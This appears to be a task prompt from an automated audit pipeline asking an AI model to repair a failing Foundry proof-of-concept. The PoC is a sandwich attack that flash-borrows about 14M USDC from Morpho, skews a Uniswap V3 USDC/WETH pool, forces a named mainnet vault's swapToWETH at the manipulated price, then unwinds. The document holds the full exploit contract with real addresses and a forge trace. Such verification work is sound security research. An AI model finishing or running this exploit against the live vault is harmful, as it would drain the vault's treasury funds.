You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Target vault's `swapToWETH` can be sandwiched at a manipulated price, draining vault value
- claim: The exploit flow first executes a large price-moving swap, then calls `swapToWETH` on the target vault at `VAULT_ADDR`, and finally unwinds the market move. Together with the in-file note referencing a slippage exploit, this strongly suggests the target vault's `swapToWETH` relies on manipulable live pool pricing and/or lacks an effective minimum-output check. A caller can therefore force the vault to trade at an attacker-controlled rate.
- impact: An attacker can temporarily distort the USDC/WETH market, trigger the vault's swap while the distorted price is live, and then unwind the manipulation to keep the spread. The vault realizes the bad execution as a direct loss of treasury assets.
- exploit_paths: ["Source enough capital to move the relevant USDC/WETH pool price.", "Execute a large swap that skews the price seen by the vault.", "Call the target vault's `swapToWETH` while the manipulated price is active.", "Reverse the initial trade and keep the profit created by the vault's slippage loss."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
}

interface IMorphoLike {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IMorphoFlashLoanReceiverLike {
    function onMorphoFlashLoan(uint256 assets, bytes calldata data) external;
}

interface IDexRouterLike {
    function uniswapV3SwapTo(
        uint256 receiver,
        uint256 amount,
        uint256 minReturn,
        uint256[] calldata pools
    ) external payable returns (uint256 returnAmount);
}

interface IDRLVaultLike {
    function swapToWETH(uint256 amount) external returns (uint256 amountOut);
}

interface IUniV3LikePool {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

contract FlawVerifier is IMorphoFlashLoanReceiverLike {
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant POOL = 0xE0554a476A092703abdB3Ef35c80e0D76d32939F;
    address internal constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address internal constant DEX_ROUTER = 0x2E1Dee213BA8d7af0934C49a23187BabEACa8764;
    address internal constant TOKEN_APPROVE = 0x40aA958dd87FC8305b97f2BA922CDdCa374bcD7f;
    address internal constant VAULT = 0x6A06707ab339BEE00C6663db17DdB422301ff5e8;

    uint256 internal constant FLASHLOAN_USDC = 13_980_773_000_000;
    uint256 internal constant VAULT_SWAP_USDC = 100_000_000_000;
    uint256 internal constant FIRST_POOL_HINT = 14474011154664524427946373127366704448275315930774981940324572871603728323487;
    uint256 internal constant SECOND_POOL_HINT = 57896044618658097711785492505624669893251560180390193455121166874571151938463;
    uint256 internal constant FIRST_MIN_RETURN = 96069676420420156;
    uint256 internal constant REVERSE_ETH_IN = 779999999999792152553;
    uint160 internal constant FINAL_SQRT_PRICE_LIMIT_X96 = 1461446703485210103287273052203988822378723970341;
    int256 internal constant FINAL_USDC_EXACT_OUT = -21291294107;

    address internal _profitToken;
    uint256 internal _profitAmount;
    bool internal _executed;

    constructor() {}

    function executeOnOpportunity() external {
        require(!_executed, "already executed");
        _executed = true;

        uint256 startUsdc = IERC20Like(USDC).balanceOf(address(this));
        uint256 startWeth = IERC20Like(WETH).balanceOf(address(this));
        uint256 startEth = address(this).balance;

        _ensureApprovals();

        if (startUsdc >= FLASHLOAN_USDC) {
            _executePath();
        } else {
            // Path stage 1 requires multi-million USDC to move the pool meaningfully.
            // If the verifier is not pre-funded with that size, use a public flash loan
            // without changing the exploit causality.
            IMorphoLike(MORPHO).flashLoan(USDC, FLASHLOAN_USDC, bytes("drlvaultv3"));
        }

        _snapshotProfit(startUsdc, startWeth, startEth);
    }

    function onMorphoFlashLoan(uint256, bytes calldata) external override {
        require(msg.sender == MORPHO, "only morpho");
        _executePath();
        IERC20Like(USDC).approve(MORPHO, type(uint256).max);
    }

    function _executePath() internal {
        uint256 receiver = uint256(uint160(address(this)));
        uint256[] memory pools = new uint256[](1);

        // Stage 2: execute a large swap that skews the live USDC/WETH price.
        pools[0] = FIRST_POOL_HINT;
        IDexRouterLike(DEX_ROUTER).uniswapV3SwapTo(receiver, FLASHLOAN_USDC, FIRST_MIN_RETURN, pools);

        // Stage 3: force the vault to swap while the manipulated price is active.
        IDRLVaultLike(VAULT).swapToWETH(VAULT_SWAP_USDC);

        // Stage 4a: reverse the router leg of the manipulation.
        pools[0] = SECOND_POOL_HINT;
        IDexRouterLike(DEX_ROUTER).uniswapV3SwapTo{value: REVERSE_ETH_IN}(receiver, REVERSE_ETH_IN, 0, pools);

        // Stage 4b: finish unwinding on the pool directly to recover USDC profit.
        uint256 ethBalance = address(this).balance;
        if (ethBalance != 0) {
            IWETHLike(WETH).deposit{value: ethBalance}();
        }
        IUniV3LikePool(POOL).swap(
            address(this),
            false,
            FINAL_USDC_EXACT_OUT,
            FINAL_SQRT_PRICE_LIMIT_X96,
            hex""
        );
    }

    function _ensureApprovals() internal {
        IERC20Like(USDC).approve(TOKEN_APPROVE, type(uint256).max);
        IERC20Like(USDC).approve(MORPHO, type(uint256).max);
    }

    function _snapshotProfit(uint256 startUsdc, uint256 startWeth, uint256 startEth) internal {
        uint256 endUsdc = IERC20Like(USDC).balanceOf(address(this));
        uint256 endWeth = IERC20Like(WETH).balanceOf(address(this));
        uint256 endEth = address(this).balance;

        uint256 usdcDelta = endUsdc > startUsdc ? endUsdc - startUsdc : 0;
        uint256 wethDelta = endWeth > startWeth ? endWeth - startWeth : 0;
        uint256 ethDelta = endEth > startEth ? endEth - startEth : 0;

        _profitToken = USDC;
        _profitAmount = usdcDelta;

        if (_profitAmount == 0 && wethDelta != 0) {
            _profitToken = WETH;
            _profitAmount = wethDelta;
        }

        if (_profitAmount == 0 && ethDelta != 0) {
            _profitToken = address(0);
            _profitAmount = ethDelta;
        }
    }

    function uniswapV3SwapCallback(int256, int256 amount1Delta, bytes calldata) external {
        _payPool(amount1Delta);
    }

    function pancakeV3SwapCallback(int256, int256 amount1Delta, bytes calldata) external {
        _payPool(amount1Delta);
    }

    function _payPool(int256 amount1Delta) internal {
        require(msg.sender == POOL, "only pool");
        if (amount1Delta > 0) {
            IERC20Like(WETH).transfer(POOL, uint256(amount1Delta));
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    receive() external payable {}
}

```

forge stdout (tail):
```
0000000000000000000000000050e0230d166501be
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xE0554a476A092703abdB3Ef35c80e0D76d32939F) [staticcall]
    │   │   │   │   │   └─ ← [Return] 803453346221145626688 [8.034e20]
    │   │   │   │   ├─  emit topic 0: 0xc42079f94a6350d7e6235f29174924f928cc2ac818eb64fed8004e115fbcca67
    │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │           data: 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffb0af0a26500000000000000000000000000000000000000000000000050e0230d166501be00000000000000000000000000000000000040aad4794c610a650b7b749c64f00000000000000000000000000000000000000000000000000389488cfc7d7ba2000000000000000000000000000000000000000000000000000000000002f6fa
    │   │   │   │   └─ ← [Return] -21291294107 [-2.129e10], 5827696456934687166 [5.827e18]
    │   │   │   ├─ [3462] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::approve(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   │   ├─ [2673] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::approve(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
    │   │   │   │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │        topic 2: 0x000000000000000000000000bbbbbbbbbb9cc5e90e3b3af64bdaf62c37eeffcb
    │   │   │   │   │   │           data: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop]
    │   │   ├─ [6549] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::transferFrom(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb, 13980773000000 [1.398e13])
    │   │   │   ├─ [5754] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::transferFrom(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb, 13980773000000 [1.398e13]) [delegatecall]
    │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │        topic 2: 0x000000000000000000000000bbbbbbbbbb9cc5e90e3b3af64bdaf62c37eeffcb
    │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000000cb727022340
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   └─ ← [Return]
    │   ├─ [1339] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 27122517184231891380 [2.712e19]
    │   └─ ← [Return]
    ├─ [341] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 27122517184231891380 [2.712e19]
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 23769386 [2.376e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x61fFE014bA17989E743c5F6cB21bF9697530B21e.uniswapV3SwapCallback
  at 0xE0554a476A092703abdB3Ef35c80e0D76d32939F.swap
  at 0x61fFE014bA17989E743c5F6cB21bF9697530B21e
  at 0x8aA6B0E10BD6DBaf5159967F92f2E740afE2b4C3.swapToWETH
  at 0x6A06707ab339BEE00C6663db17DdB422301ff5e8.swapToWETH
  at FlawVerifier.onMorphoFlashLoan
  at 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb.flashLoan
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 86.88s (86.00s CPU time)

Ran 1 test suite in 86.89s (86.88s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 10138038)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
